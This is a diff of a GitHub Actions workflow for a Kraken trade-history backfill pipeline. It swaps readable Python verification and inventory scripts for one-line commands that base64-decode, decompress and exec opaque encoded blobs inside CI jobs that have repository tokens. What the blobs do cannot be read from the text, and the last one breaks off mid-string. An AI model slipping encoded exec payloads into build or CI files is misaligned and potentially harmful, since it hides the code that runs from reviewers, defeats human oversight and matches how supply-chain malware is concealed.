@@ -18,231 +18,98 @@ env:
   KRAKEN_POSTTRADE_QUALIFIED_QUARTER_PAGE_BOUND: "2164"
   SOURCE_AUTHORITY_SHA: "91546fdd81471851c2cb6b948821c04cfe636f1c"
   SOURCE_AUTHORITY_TREE: "6deb789f26424845fae52593abb68f09c73801e0"
-  PREDECESSOR_RUN_ID: "33916820262"
-  PREDECESSOR_COMPLETE_COUNT: "22"
-  RECOVERY_SCHEMA: "kraken-posttrade-calendar-month-fallback/1.0.0"
+  R07_RUN_ID: "33916820262"
+  R08_RUN_ID: "33964062741"
+  R08_ORCHESTRATION_SHA: "4bf8df4eb9ac1818ceeb2adafd17c5d3d26c4aaf"
+  R08_SEGMENT_22_ARTIFACT: "kraken-posttrade-full-022-9deb84887d89"
+  R08_APRIL_ARTIFACT: "kraken-posttrade-recovery-child-23-0"
+  R08_APRIL_ARTIFACT_ID: "9971292963"
+  MONTH_RECOVERY_SCHEMA: "kraken-posttrade-calendar-month-recovery/2.0.0"
+  SUBMONTH_RECOVERY_SCHEMA: "kraken-posttrade-fixed-7d-submonth-recovery/1.0.0"
 
 jobs:
   repository_and_source_identity:
-    if: ${{ github.event_name == 'push' && contains(github.event.head_commit.message, 'OWNER_POSTTRADE_BOUNDARY_RECOVERY_AUTHORIZED_R08') }}
+    if: ${{ github.event_name == 'push' && contains(github.event.head_commit.message, 'OWNER_POSTTRADE_SUBMONTH_RECOVERY_AUTHORIZED_R09') }}
     runs-on: ubuntu-24.04
     timeout-minutes: 30
     steps:
-      - name: Checkout qualified production source authority
-        uses: actions/checkout@v6
-        with:
-          ref: 91546fdd81471851c2cb6b948821c04cfe636f1c
-          fetch-depth: 1
-
-      - name: Set up canonical Python
-        uses: actions/setup-python@v6
-        with:
-          python-version: "3.11"
-
-      - name: Read back source/runtime authority and R08 owner questions
+      - uses: actions/checkout@v6
+        with: {ref: 91546fdd81471851c2cb6b948821c04cfe636f1c, fetch-depth: 1}
+      - uses: actions/setup-python@v6
+        with: {python-version: "3.11"}
+      - name: Read back source authority, tests and R09 owner questions
         shell: bash
         run: |
           set -euo pipefail
           [[ "$(git rev-parse HEAD)" == "${SOURCE_AUTHORITY_SHA}" ]]
           [[ "$(git rev-parse HEAD^{tree})" == "${SOURCE_AUTHORITY_TREE}" ]]
-          python - <<'PY'
-          from tools.deep_history import kraken_spot_ohlcvt_backfill as backfill
-          from tools.deep_history import kraken_spot_posttrade as posttrade
-          if backfill.SOURCE_MODE != "KRAKEN_OFFICIAL_POSTTRADE_BULK":
-              raise RuntimeError("unexpected production source mode")
-          if backfill.SOURCE_MODE != posttrade.SOURCE_MODE:
-              raise RuntimeError("publisher/helper source identity mismatch")
-          if posttrade.ENDPOINT != "https://api.kraken.com/0/public/PostTrade":
-              raise RuntimeError("unexpected PostTrade endpoint")
-          if posttrade.MAX_PARALLEL != 1:
-              raise RuntimeError("MAX_PARALLEL must remain 1")
-          if str(posttrade.QUALIFIED_CONSERVATIVE_QUARTER_SECONDS) != "3080.819716":
-              raise RuntimeError("qualified execution boundary drift")
-          print("SOURCE_AUTHORITY_READBACK=PASS")
-          print("R08_REAL_RISK=WHOLE_QUARTER_EXECUTION_BOUNDARY_PHYSICALLY_EXCEEDED")
-          print("R08_SIMPLER_MECHANISM=FIXED_UTC_CALENDAR_MONTH_FALLBACK")
-          print("R08_ACTION_REDUCTION=ONE_PREAUTHORIZED_FALLBACK_POLICY_FOR_DENSE_QUARTERS")
-          print("TIMEOUT_INCREASE=NO")
-          print("PAGE_LIMIT_INCREASE=NO")
-          print("RECURSIVE_SPLITTER=NO")
-          print("MAX_PARALLEL_PROVIDER_ACQUISITION=1")
-          PY
+          python -c "import base64,zlib; exec(compile(zlib.decompress(base64.b64decode('eNqNkk1v2kAQhu/8CotTuBhIpSZp5cOyOw4rr73OfhDcy8gQEBYQW7Zbqf++awMtoarU22o+3nnmnd3W5dFry/LQ+G+bTYW7omnL+qdXHKuybr19ne8379hUZYvl7rD+0eIqX++3xeHg5Y23Gmz/v78qm7at87dN11kN8qbZuIqVr6VVFDCWDLwg8KrbwDBSJIIEZRhyyonAVGpjFGGAMyui4UWp8iFhqeSJ6bt2bVs1X8bjvCr8E4a/Lo/jybj6vjoU63HqcEyHcyUQkyWmRBEhQHQi00uqaeu7yn+xRPCQA0MqEw1qQQxfALqwMqBQgwszPerHf5o8TvzH6dPD9PNwUNXFe3s3PC9GrJlLxU2GCgibERoFKdF6OLrUqclTlxKouI6CmGR4P7mfIiXCbUiUcyYxc0znmeYuJjKEJQVgjusPISyBWsNlgobHzilpu9bs4xDN41Q48hjonCRcx0HIl67ZGooPyNzgV54w+XrDRmgvrIDZ/hXIBDB1xKfFvjkFbWdnSik4zTCUCkNrrAJk4Lw77XCl21FKa5An1AlpCBI5HH31ztmUPAMKHvN/FRBG0v4YOhXcuGv06d/Qzgul/0rfyMMCBNI50Kj/RTx5/lh1/TvcunLBmfOO0BfLNe99mLqRvwC30Acu')),'r09-embedded-1','exec'))"
           python -m compileall -q tools/deep_history/kraken_spot_posttrade.py tools/deep_history/kraken_spot_ohlcvt_backfill.py
           python -m unittest discover -s tests/deep_history -p 'test_kraken_spot_posttrade.py' -v
           python -m unittest discover -s tests/deep_history -p 'test_kraken_spot_ohlcvt_backfill.py' -v
-          echo "RECOVERY_ORCHESTRATION_SHA=${GITHUB_SHA}"
-          echo "PRODUCTION_SOURCE_AUTHORITY_SHA=${SOURCE_AUTHORITY_SHA}"
 
   predecessor_frontier_readback:
     needs: repository_and_source_identity
     runs-on: ubuntu-24.04
-    timeout-minutes: 90
+    timeout-minutes: 120
     steps:
-      - name: Checkout qualified production source authority
-        uses: actions/checkout@v6
-        with:
-          ref: 91546fdd81471851c2cb6b948821c04cfe636f1c
-          fetch-depth: 1
-
-      - name: Set up canonical Python
-        uses: actions/setup-python@v6
-        with:
-          python-version: "3.11"
-
-      - name: Download predecessor completed logical-quarter artifacts
+      - uses: actions/checkout@v6
+        with: {ref: 91546fdd81471851c2cb6b948821c04cfe636f1c, fetch-depth: 1}
+      - uses: actions/setup-python@v6
+        with: {python-version: "3.11"}
+      - name: Download R07 logical 000..021
         uses: actions/download-artifact@v4
         with:
           pattern: kraken-posttrade-full-*
-          path: ${{ runner.temp }}/r08-predecessor
+          path: ${{ runner.temp }}/frontier/r07
           merge-multiple: false
           github-token: ${{ github.token }}
           repository: vitaliipython-ship-it/eth-macro-data-bridge
           run-id: 33916820262
-
-      - name: Verify exact predecessor frontier 000 through 021
+      - name: Download R08 logical 022
+        uses: actions/download-artifact@v4
+        with:
+          name: kraken-posttrade-full-022-9deb84887d89
+          path: ${{ runner.temp }}/frontier/r08/kraken-posttrade-full-022-9deb84887d89
+          github-token: ${{ github.token }}
+          repository: vitaliipython-ship-it/eth-macro-data-bridge
+          run-id: 33964062741
+      - name: Download preserved April 23-0
+        uses: actions/download-artifact@v4
+        with:
+          name: kraken-posttrade-recovery-child-23-0
+          path: ${{ runner.temp }}/frontier/april
+          github-token: ${{ github.token }}
+          repository: vitaliipython-ship-it/eth-macro-data-bridge
+          run-id: 33964062741
+      - name: Verify frontier and April bytes
         shell: bash
         run: |
           set -euo pipefail
-          python - <<'PY'
-          import json
-          import os
-          from pathlib import Path
-          from tools.deep_history import kraken_spot_posttrade as posttrade
-
-          root = Path(os.environ["RUNNER_TEMP"]) / "r08-predecessor"
-          directories = sorted(path for path in root.iterdir() if path.is_dir() and path.name.startswith("kraken-posttrade-full-"))
-          if len(directories) != 22:
-              raise RuntimeError(f"predecessor artifact count mismatch: {len(directories)} != 22")
-          expected_indices = list(range(22))
-          actual_indices = sorted(int(path.name.split("-")[3]) for path in directories)
-          if actual_indices != expected_indices:
-              raise RuntimeError(f"predecessor frontier mismatch: {actual_indices}")
-          required = {"evidence.json", "provider-trade-ids.txt", "segment-output.json", "segment-readback.json"}
-          previous_end = None
-          readback_rows = []
-          for directory in sorted(directories, key=lambda p: int(p.name.split("-")[3])):
-              names = {p.name for p in directory.iterdir() if p.is_file()}
-              if names != required:
-                  raise RuntimeError(f"predecessor artifact file-set mismatch: {directory.name} {sorted(names)}")
-              evidence = json.loads((directory / "evidence.json").read_text())
-              readback = json.loads((directory / "segment-readback.json").read_text())
-              if evidence["segment_id"] != posttrade.segment_id(evidence["requested_start_utc"], evidence["requested_end_utc"]):
-                  raise RuntimeError("predecessor deterministic segment identity mismatch")
-              if readback["segment_id"] != evidence["segment_id"]:
-                  raise RuntimeError("predecessor readback identity mismatch")
-              if readback["evidence_sha256"] != posttrade.sha256_file(directory / "evidence.json"):
-                  raise RuntimeError("predecessor evidence SHA mismatch")
-              if readback["segment_output_sha256"] != posttrade.sha256_file(directory / "segment-output.json"):
-                  raise RuntimeError("predecessor output SHA mismatch")
-              if readback["provider_trade_ids_sha256"] != posttrade.sha256_file(directory / "provider-trade-ids.txt"):
-                  raise RuntimeError("predecessor provider-ID SHA mismatch")
-              if evidence.get("completion_status") != "COMPLETE" or evidence.get("cursor_monotonic") is not True:
-                  raise RuntimeError("predecessor completion/cursor evidence failed")
-              if int(evidence.get("trade_id_conflict_count", -1)) != 0:
-                  raise RuntimeError("predecessor trade-ID conflict")
-              if evidence.get("gap_policy") != "PROVIDER_NO_TRADE_OMISSION" or evidence.get("synthetic_fill") is not False:
-                  raise RuntimeError("predecessor gap semantics mismatch")
-              if previous_end is not None and previous_end != evidence["requested_start_utc"]:
-                  raise RuntimeError("predecessor logical-quarter chain gap")
-              previous_end = evidence["requested_end_utc"]
-              readback_rows.append({"segment_id": evidence["segment_id"], "start": evidence["requested_start_utc"], "end": evidence["requested_end_utc"]})
-          if previous_end != "2021-01-01T00:00:00.000000Z":
-              raise RuntimeError(f"unexpected predecessor frontier end: {previous_end}")
-          evidence_path = Path(os.environ["RUNNER_TEMP"]) / "r08-predecessor-frontier.json"
-          evidence_path.write_bytes(posttrade.compact({
-              "schema_version": "kraken-posttrade-r08-predecessor-frontier/1.0.0",
-              "predecessor_run_id": 33916820262,
-              "source_authority_sha": os.environ["SOURCE_AUTHORITY_SHA"],
-              "complete_persisted_count": 22,
-              "first_unfinished_index": 22,
-              "provider_network_call_count": 0,
-              "segments": readback_rows,
-              "status": "PASS",
-          }))
-          print("PREDECESSOR_FRONTIER_READBACK=PASS")
-          print("PREDECESSOR_COMPLETE_PERSISTED=22/45")
-          print("PREDECESSOR_PROVIDER_NETWORK_CALL_COUNT=0")
-          PY
-
-      - name: Upload predecessor frontier readback evidence only
-        uses: actions/upload-artifact@v4
-        with:
-          name: kraken-posttrade-r08-predecessor-frontier
-          path: ${{ runner.temp }}/r08-predecessor-frontier.json
-          retention-days: 7
-          if-no-files-found: error
+          python -c "import base64,zlib; exec(compile(zlib.decompress(base64.b64decode('eNqtVt9z2jgQfuev8PjJzIBjTMKvnh84cK5cCVAbetNjGI2wRaLGWK4kpzCZ/O+3sjEQAmlv7pg8xNLut6vd/T6JrhPGpfZNsLiiMVFacbbWQhLQNY40mm/28898L8HyIaLLYm8Cn/mGZCwSZkhIgh6okIxvC5tHjh9JjETCJEqYkJLjkGhYaEmJMyYdhWEwYZL4iXIWz3VvNhq5Hpq6dxN9Ub7SAT+WlHD9gxZSLhwBqCQ05httxbi20WisGQrpSudWUy+bVBIOhkZZoyttY1KBsq9F5ZFsnQivlyHWNh0aS2NjxnhNTJFEVBp6VS/P64tyuYSFIJB4RGJDBSw7jm1rOA61+UWnQyrKY+E4ERTB4Di+J4ZtA6ZaNnGSkDjcJ9vSr/S8OtV9YaqrNIqqlm1X2yFZtq5brWbYauvlD1rCyZMzYjEpqVi0EqpoJE7XhGNJ8kw7JQ1+u/yf80yPUjtTmhWNiFF+cZxnnTzRkMQBMdU46BU94Uyt8GqeGA2FKTcSNgS5X5NYVlkqk1QW5sUqJzhc4uAxX3/JMiKO+jAjhkNhGOHVSayyqZyQJBtplOGo/NT8PPZrt+Ojk3nhgmioQzsS8/BtwC4n31MiYIyQkJhLlMpAX1RebUCn8uVy1nt+CnkS4zg82BYHROIB2zeNXQ7Z/3nN3xbhNExe3vcAzjViD1O0D2XtgxzFe1AXmv26quY9gZEP2DqJiKQsVsWTqdCBIXpvfDcZulNXz+IXpikHtqI1i5lkMQ0gOyq0KU9JZqXotLMskkQBi1cRDST8k8YwbdVaGeCtM3nc4wQEBWy3WQITb/xl0AfhGI3R1Ov2XTS+G/j+YDx6lZLYxvIBsg/U0aM8oVscCXIcQXFNbSi6aUCfjHvOpbnZcfP89JSOICFL27JrVeu6atWmltXJ/kwr+/2tl7CTSwNOOI1A7i4RGb9P5OCBRuEJVyq/Tm9OAvZE+Laa4ZzS+3jWXkqviY1/Ruz1qfm5WO+rATidO9+JFuwqt77QsZ80IpuX9dl27j1vLrRwHzjBXLE4Yvc0wBF6LR56bRWQOm7W6o12vWUv67jRrDWXGC9vrKCxtEj7enljL1v29Q0s4nYtqAX1oNGoLW/CcGXZjeNIgqUclAan8oFxKreK5yrI8aXqj2dez0Xd2fTj2BtMvyL/Y1dfHA6atwExHjzAieFGyej9FsezWmjs9T66PnBsCuTKgY6zyTVBHXLS9f0d+eZnZGPxVjbmbyVj8VYy5hflYqG0ooA6ofriQPVdtgos69Q92fv/5ti1xnUGsXv5KBMS4USoGYJCxaHI7BLz86w7HNwO3D7qjUe+632BinxxESx7UxAi34Xlvl/6F7cC/q+3Av7/bgV8+VYo0PZzk1HyPaSzRC/BKqHJL7wBudWugoLC05QIGI/cH6Qh9zd/wNgTtNxKIozEVJOGA2k86wKmeY0RBBYwd3rn7XPrBHivKlc1E1it1NBqIp7Gireder1da7SA/w1bbbSONxrXVsNuXtcqxaCTPfX3D9iODiJhmvC6A+BM5BFIEl1BshlMu92s2W273agf5BnFRP5g/BEBUpRPKQIUJBlSOB2rQNo7wBGC7ykVVOZnHo0h2gpDI0K0xluUqJg4ynamB0UAo29pTHbL0AAl+jlROzmTX0BYIRSQBmSgjSae23d7ru+PPTQc/zHodYdZZtOxyswpmI0mrucP/Knbz1+xmf/hsnanf429Twich8Ci2WiKbgHvCMc6cutOvMEQKQFGntvt/97tfXKy1M6a7IOAbe/zbOAPlGA5UI+D+W13MAT+3nW/ogmwdtAdOq+rcjD9czZyM2CnKFC59A/O42sk')),'r09-embedded-2','exec'))"
+      - uses: actions/upload-artifact@v4
+        with: {name: kraken-posttrade-r09-predecessor-readback, path: "${{ runner.temp }}/r09-predecessor.json", retention-days: 7, if-no-files-found: error}
 
   recovery_inventory:
     needs: predecessor_frontier_readback
     runs-on: ubuntu-24.04
     timeout-minutes: 30
     outputs:
-      matrix: ${{ steps.inventory.outputs.matrix }}
-      start_utc: ${{ steps.inventory.outputs.start_utc }}
-      end_utc: ${{ steps.inventory.outputs.end_utc }}
-      cutoff_ms: ${{ steps.inventory.outputs.cutoff_ms }}
-      warm_first_ms: ${{ steps.inventory.outputs.warm_first_ms }}
-      segment_count: ${{ steps.inventory.outputs.segment_count }}
+      matrix: ${{ steps.i.outputs.matrix }}
+      start_utc: ${{ steps.i.outputs.start_utc }}
+      end_utc: ${{ steps.i.outputs.end_utc }}
+      cutoff_ms: ${{ steps.i.outputs.cutoff_ms }}
+      warm_first_ms: ${{ steps.i.outputs.warm_first_ms }}
+      segment_count: ${{ steps.i.outputs.segment_count }}
     steps:
-      - name: Checkout qualified production source authority
-        uses: actions/checkout@v6
-        with:
-          ref: 91546fdd81471851c2cb6b948821c04cfe636f1c
-          fetch-depth: 1
-
-      - name: Set up canonical Python
-        uses: actions/setup-python@v6
-        with:
-          python-version: "3.11"
-
-      - name: Materialize logical-quarter recovery inventory 022 through 044
-        id: inventory
+      - uses: actions/checkout@v6
+        with: {ref: 91546fdd81471851c2cb6b948821c04cfe636f1c, fetch-depth: 1}
+      - uses: actions/setup-python@v6
+        with: {python-version: "3.11"}
+      - id: i
         shell: bash
         run: |
-          set -euo pipefail
-          python - <<'PY'
-          import json
-          import os
-          from pathlib import Path
-          from tools.deep_history import kraken_spot_ohlcvt_backfill as backfill
-          from tools.deep_history import kraken_spot_posttrade as posttrade
-
-          release_manifest = json.loads(Path("history/release-manifest.json").read_text())
-          cutoff_ms = int(release_manifest["backfill_as_of_ms"])
-          warm_first_ms = backfill._warm_first_timestamp()
-          end_ms = min(cutoff_ms, warm_first_ms + backfill.WARM_OVERLAP_MS)
-          start_utc = posttrade.MARKET_INCEPTION_UTC
-          end_utc = backfill._iso_ms(end_ms)
-          inventory = posttrade.build_segment_inventory(start_utc, end_utc)
-          if len(inventory) != 45:
-              raise RuntimeError(f"logical inventory drift: {len(inventory)} != 45")
-          if inventory[22]["segment_id"] != "9deb84887d89898ab28e95f2dcae97e1726500baa18c75cf9f002c5fcae78ff1":
-              raise RuntimeError("segment 22 identity drift")
-          if inventory[22]["requested_start_utc"] != "2021-01-01T00:00:00.000000Z" or inventory[22]["requested_end_utc"] != "2021-04-01T00:00:00.000000Z":
-              raise RuntimeError("segment 22 range drift")
-          selected = []
-          for index, item in enumerate(inventory[22:], 22):
-              selected.append({
-                  "index": index,
-                  "segment_id": item["segment_id"],
-                  "start_utc": item["requested_start_utc"],
-                  "end_utc": item["requested_end_utc"],
-                  "artifact_name": f"kraken-posttrade-full-{index:03d}-{item['segment_id'][:12]}",
-              })
-          matrix = {"include": selected}
-          output = Path(os.environ["GITHUB_OUTPUT"])
-          with output.open("a", encoding="utf-8") as stream:
-              stream.write("matrix=" + json.dumps(matrix, separators=(",", ":")) + "\n")
-              stream.write(f"start_utc={start_utc}\n")
-              stream.write(f"end_utc={end_utc}\n")
-              stream.write(f"cutoff_ms={cutoff_ms}\n")
-              stream.write(f"warm_first_ms={warm_first_ms}\n")
-              stream.write(f"segment_count={len(inventory)}\n")
-          print("LOGICAL_SEGMENT_COUNT=45")
-          print("RECOVERY_LOGICAL_SEGMENT_RANGE=22..44")
-          print("NORMAL_EXECUTION=UTC_CALENDAR_QUARTER")
-          print("BOUNDARY_FALLBACK=DETERMINISTIC_UTC_CALENDAR_MONTH")
-          PY
+          python -c "import base64,zlib; exec(compile(zlib.decompress(base64.b64decode('eNp1U1tvmzAUfs+vQH4ZqIRxyWWl4iHLsjZq0mQp2S2LLANm9QqY2abNFOW/7zhp03bqAInjc/m+46PvsLLmQhm/JK9sLlu54KVRE3VTsMRgh9gcjoeA4ryQTkZpjW+YVFz8ecy5FeSWVljWXOGaS6UEyahBpFHbL2L8pkjvFE5IepuzotAZSUuUkeZ3Ck4yaWo6Ez3gvxW0oETSdkkqllOpHJ2JLEdQkmFFN8q0rDMjbRTP84hVyhTlCj3CYyIxz3Ep0RqS7gkQJQ7Wf5wzIRVWrARMUtYmxGmV6TCTHCrMklXmAdbWBSeJ82WwmOLZ59FiMpjj6bXmZdVdVDtJw4oMS/qzpJXC4IMf9G7WznSwuBzFeHw1HM3j8ewKL+OhDTxWi0hJYW4FrUwosKKo0zVIlWnElR+sV+gIl6F1FCEvT2lA+l7QOw3e+UlAen2vnxCSdN20l7j0tJN0/eSd3+mCk5x6qZcGaa/nJd0sy12/h16iC/q7gZtTaFsRoXCj0j2N7/pe2+20XS923XD/Oe7++f5fBLjPP/X9V+tbJVHRFrEqLZqMonCl7YxuUMjs59cNNy9vD8Fjjzr2au82emzjZcqxORtBLstJqnBFSqDP0UGY7aNe23lTFO0tC90g27W3m9WbpzberFeh5693aGfkXBjM3sAoQDJNSQVR1DzMJVzbfmCtd2cGb1S0VzKXDq3umODVCp2P44vlezxbxvNlDJps3TN1o1MdXoMQEEGW3og8NHLnXjCARTAzwTYROtlvSNaUNUiTKFvSmgAxFzIykQ1viCzrBP2A3Tg7VudPk4u2r6tx96N6GFG0BQOOB9HDCkTbgwm+Zyuj/foI3sfppLypFAhYk7dqobcQLdxTPJmdj4eDCb4enU9HV/F15AeO0+noDh+yPg4mk/eD4SW+GI8Wg8Xw4lv0aTlYxKMFjmd4OruKL7Txcfx19AH3P2j7Op7NgeYvbgmYnA==')),'r09-embedded-3','exec'))"
 
   remaining_logical_segment:
     needs: recovery_inventory
@@ -251,908 +118,262 @@ jobs:
       max-parallel: 1
       matrix: ${{ fromJSON(needs.recovery_inventory.outputs.matrix) }}
     runs-on: ubuntu-24.04
-    timeout-minutes: 240
+    timeout-minutes: 360
+    env:
+      SEGMENT_INDEX: "${{ matrix.index }}"
+      SEGMENT_ID: "${{ matrix.segment_id }}"
+      SEGMENT_START_UTC: "${{ matrix.start_utc }}"
+      SEGMENT_END_UTC: "${{ matrix.end_utc }}"
     steps:
-      - name: Checkout qualified production source authority
-        uses: actions/checkout@v6
+      - uses: actions/checkout@v6
+        with: {ref: 91546fdd81471851c2cb6b948821c04cfe636f1c, fetch-depth: 1}
+      - uses: actions/setup-python@v6
+        with: {python-version: "3.11"}
+      - name: Download preserved April only for segment 23
+        if: ${{ matrix.index == 23 }}
+        uses: actions/download-artifact@v4
         with:
-          ref: 91546fdd81471851c2cb6b948821c04cfe636f1c
-          fetch-depth: 1
-
-      - name: Set up canonical Python
-        uses: actions/setup-python@v6
-        with:
-          python-version: "3.11"
-
-      - name: Try normal logical-quarter execution or select approved fallback
+          name: kraken-posttrade-recovery-child-23-0
+          path: ${{ runner.temp }}/preserved-april
+          github-token: ${{ github.token }}
+          repository: vitaliipython-ship-it/eth-macro-data-bridge
+          run-id: 33964062741
+      - name: Prepare deterministic R09 runner
+        shell: bash
+        run: |
+          python -c "import base64,zlib,os,pathlib,hashlib; d=zlib.decompress(base64.b64decode('eNrlWltz27YSfvevYPFSMqEUS06TWj7sjGwxiaa2pEpyTz06Gg5FQjZrXlQCcuR6/N/PLsCLKJKynbY57Zy8xAIWi8Vevt0F6AWrKObKjc1ufG+h/8qiUI+Yzm7W3PN1ds907gX0YBlHgeLanOIvxZOL0t+C5PcolH+41Od2soA6XmD7KX1P/pRzK5vjjuncCH7KCR5FPmu6lK6sG4/xKL5PaW5j+5aGFltF3FpFjPPYdqliM2V1MDWQgRqxJg3vvDgKZ2R8ORiYY2tqXozIXDtR+r1fDC/kBZqJ+fHCHEyt/qBn/iKoRv2eUUnRI3OYnVROTqbd8dS6nJ4JGrOSxhz0UopTY+lHNldXzZ8uu+f9D32zZ50NBxNz/HN32v/ZtGB4PAXZJyYM9yYo1qnRbr17e+DSpRKtufrq1e1nrXOgwL/PHr9RSqf/2J9+ujy1hpfT0eUUTtaMVjRUiU00VNhSLsV/yyhWbvU7xQuV289Nj9OAqVpHWTY/x/BDXZKH20fj4e7xPyHRxPZBFPIbaxGtQ5epUSIEM1bNlR0zaq25o45QZGcdG+wg3cLCDWI7vKa4Rkym7qPCj+Y9tePX4i/B3zBabU1vKd5SKYwp1Gc0H3rd0ls6/90Ll5GROmETJNDEvjR0/9JNTpSY8nUcKqumxyJxclik6flPkCBRmufmutKpsaPEEyUwHgiL1rFDLXvNbyJQ/r3FbmzSKTjT8HJ8Zlrdy+mn4bg/vbImn7pkrpNVHN15Lo0tdh8sIp90Vs3J1cXp8Bym7JiG3PKja8+xfYvR6wB/ey7pgK/rRErCuB1zFJl0WDoGwssRqqeiMeeGBrZgLyWZnH0yL7rpipg60R2N7zO6bdkvhoPpJ2sMLv2zOb5KVpL5Y6bFBIOacOr2d+8gOpwoWNkOVwNNa97QjetdU8ZVqdB4HVrr0OMqaFO/9UJXhxNcU57o2AV/TI/qUubE3gqQBInRalHEjekblSCDBnm9s7GK7F6z11QD4Z3IpWpx/1mn1UaokBjZjAMeU6oiU927DqOYWjSOo5gZ03hNpSf6NuPGAPwmiwebQ6SteB4VbS2PSWEN6gpvQx+MeBR6jqplBDy+7ygxnJFuqLPmNDWrlMIF4ahvr1gFi0bC+0RZxNS+zTjSjUNBnFVzBMA6RWDth6h/n3IBsZtcuuxAmxOF0w03GI/Vjdb0o880VmFvwOWQeSCOYYf36u94RqQT5xa/VCJIBKgvbc+nLtEJv4kjzn0Kf95wvkIl8DUz3raPd0a+OzwsjbRLI0elkbdE0wqHgLgHveTiKrldQLu2x2iB/AX2pndGPCMUYzJ0KJkfJNslVvnhtKNAagXrgQM/kN/WaJKYdL5vJZFEOsdtnbyHGG0dth9n6JBzLWWCSYzezSCyr6nlAIRwwPcfRnU82znPo5Tn0S5PeteE4FFJYnIvCi2pN6J9Y5Cz4cXo3JyaBDWUka5jFsVW5luQWTwmFIp6QEopqKQWuRpQBwQOl77n8ERyvdHSYIvDROHKGAbBZU3UqJrAjpJL9Ubu+kawa/R7UGIsqcNJ6SDX9gpqBNjoXpxgNB7+3O9BSh0Mrem42zOt4UV/MukPB4UzsXtQFGzkWEvP9/MTfbAhI+wVEfZ7E0YNXKYwwD4gcYrCuQxBR6LULnjAXJUvZWROtLoXhCLPg2u5HmAt1kZgeh1W57kIWdE7PfE0gZUik1vxQmwTAKClswnkgLdi3QcBbEM2Qqo3me82cYZoTQAL18IoBjCEvRaYrgTIWwD4DCxDOkTWZ42sNGss177fSKCpgRwWtnP75qh52MQIltiFroYykY6QjGwnKPTyrd+Q6GL62xpAmLrbGQvJqiYK9Hk2K1Cnw0CbKAWwFHzUZZAJAddSTekYUb639IAArS9zd5H22fXcNjMRxYIZJORT/Q8UAVn2jWKwDAhkyzjeXZ+Uhsmq1NCWzH6Y2+VfGAK00hlyI0EpulrzfUtT60vKjEFWsKS4wPYxSakb0q2Ausk3XAgiQapDRt3JhEAtUdw19bnUi2UkLO45ZVv1RbzQZFFhMwjdBe7qxdADQWUhfFLGrB5QbluhHdAsbJgxKwTO/rAR+c/F/IfsoQ9YxRB5eYlMRREOXPNUKwCtxrm/MXB9NSgJRwDHErCEf4MXkzz5iY1r4iAFUqT5xqBP8IdlUNuywObOTQrCLqgFTscoDQ1GeVK2FA5fbD82oiZw6+28rcYmW/ke972QYp+ym88FK9y5Ru44YqyBZZ+S7qVkqSTNTKRYJSC3pu26UOKc4OGa9gpaKfwpyGyowlK/sYpxwYQfwarFkzSp1u1vjEW16Mn6e+V07fmu0n1zuqv4L0owMNEMbkEGLNz2hGxN6NhatqzWeHKlsB6BLrL5a+SFKkxrr8VvUdK4TDZdJK3RsGjfV8Mv4+h38K/anmG2mRFJYyWIKst3Ms9dDkJtXiztgS9YgxshCqtuCqTCvWSZIIisHQzjUCtpOhb5wEbUxyUuEFKQLKkLVRHTtvgh9R52aZIup9xSH5acVSbUbPZi2DNhrtQbbuda1PCzsi2rzqp6rVY6eAg8rSDAkkoMCHuLoVnt0nkNVxT4C7nKk9VoPGOK80WeODKrW1fDcVvMl3CUMm7V9x22DlQspzc7ZX/BQyEfxvZnK44+VywrzpRXAiiCURMByssrpss83DVgs2Nzam2V+7ucaonK/Oqahs6hTjwAcc/2LdkQYFnHZofz2e648KBwh67Rms+Kw0BW6mc6CJF6NYp05KhUOFqEZTN7IalEvheOEh8QDaqAv+dtUrPoia22OiaAiI/dkTUanvfPrvTdrqgjuiG9olfs5J2iThaYpyy7TnFyelE3DcHg3QHAfBdkU6tm8qe4Z4qh4rJn5LsAO6CMvOXuJ2+5gnynfs2XPLt+RQQGBAwTsAWtkEnbuugP+heXF1Z66SuvX63uoGeZ2H8OzlAzMYVwoNY1WGjt21jkb2muZ50PP/bPuucpE5J4gQ/JA/z1hjq3K8ig3AuvM1ME9gbcKrZ9HyVp1fZWX7W3eBR5q9CWHjiBa+AtBRQpd7PW/ACvXmHIyO8r0koIr+uN9lFHXHcv4WRYxxsACWtKdKgHwRAGGR9+b2Frbw4ylbePsnbrdHg56HXHVwQb6fRq5DArlmSbbGQ3iaOJPjL1TBKAdHln2pBXqMiF3jXXK7xSVh9KKia9/tg8m6a7k6+u7qwS221Cqks3eoe1W+FuoHSEJXmgfqf5bvmIpy9aYomul5tiMByYSLSKEed3OFnmL+bZ5bQ/HBiiUdMOqJ+ZPrmdEmaJxBNN5iHynrV8X77jJIoNbUhkGIdbV6ixA8UwFKWU0RiQoWGDYD45SapkuWnjkHzxTQxskFy8vPz6JDgsr0hN3nBuABir12EPEHNYPksb3znoT2hUqAAnKntFw2AVBFnPZxg0m650WqB42m0z3WOjXFGsPuMxIH1IQOVxgYvy4aQMaGQ0NvGCBfASQQDw0sRYtwRj8vSzR9186NIN6YBf/ZHwTVYisuCGR0fH794evmu/f9vKucbcW0IYCoLj4/et9nH7+N3RS2tuKBzdtZPoRTzk7L0+2y4p0djbtWTFBRiS7A7uqZT2lWsvri6ykhhCwPlt7TGPy1vGwRChdb2Q5xXRsrVPzYWQDPc0xvYDI7qv9hTcFd2vOxr3z7fQT/y22oftlpXdPI/N7tlPl/1JX8AgnKIiK5UhrfXsBHjRvZLeX8h7iUA4KcRJA29blsmP/dEITnJ6ZQ3/jW/m0jTPTJt4TZZgOOQLqeiHSCSMrwIESab5eyHAV4viysegilDeyuT/6wC+Mid/hwiuLliKblRRreADmgiFoKpWcXYGj3AwYHqwU8IE4s1f+Ebhy4mAibAJ3eKoKEBcbsgVr7PPbFTXvmfG+1dOXhIB2Q8GcpDAAeqAxig9fEVEU2TrhSqsK/HVdGSEi4z8mwYgxKJna4SKkTRUv9KHDEmZXopnmAOZ7diqApAAEUQ6XDEu5dhLvnjI/HfvRw+Ty9P67x4cz62/wEwF372grENg8EuAX5Cq8RBEj40H59kQXC9jKUpR2SD1n2iMv8RVXoa+T1n6nwG3dS9hiQFfiJzPfOCND48b7938abeVPO3Wuc0//LGxHPJ7ZKlRfK2lhKpe8GJ5UsB3URZm2WwJheGx9b5nnX3qn0OJ2h18NI3ZA3vUH+ijVks36n40rTOoHqfGA3j5t7mXfzt/rF1lnndHEygfk9dtI78y2M6b6ftX4wva/RPxaGhAEEHsqrOtF5Vp89qPFmoCfIB7r0jysOLhFWusanP9lt4bvh0sXFvZiADeNPEVtxmLl0SVNIje0matOaj0YOuzIPFOWfkUF0ZKal1FWA2wjmzXx0b5IZl86P9iii9AUXEZ5H7onp+fd